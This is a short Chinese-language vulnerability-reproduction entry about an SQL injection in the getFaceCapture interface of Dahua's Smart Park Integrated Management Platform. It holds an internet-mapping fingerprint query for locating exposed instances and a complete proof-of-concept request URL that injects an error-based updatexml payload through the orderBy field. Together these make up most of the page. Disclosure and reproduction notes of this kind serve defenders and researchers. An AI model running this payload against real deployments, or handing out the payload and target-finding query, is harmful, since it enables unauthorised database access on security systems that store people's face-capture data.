---
title: "大华 智慧园区综合管理平台 getFaceCapture SQL注入漏洞"
date: 2026-10-18 09:15:59
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "大华"
tags:
  - "大华"
  - "SQL注入"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

大华 智慧园区综合管理平台 getFaceCapture 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意SQL语句，获取数据库敏感信息

## 漏洞影响

智慧园区综合管理平台

## 网络测绘

```
app="dahua-智慧园区综合管理平台"
```

## 漏洞复现

![image-20230828144644472](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828144644472.png)

请求POC

```
/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(123)),0x7e),1)--%22%7D/extend/%7B%7D
```

![image-20230828145938818](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828145938818.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getFaceCapture-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
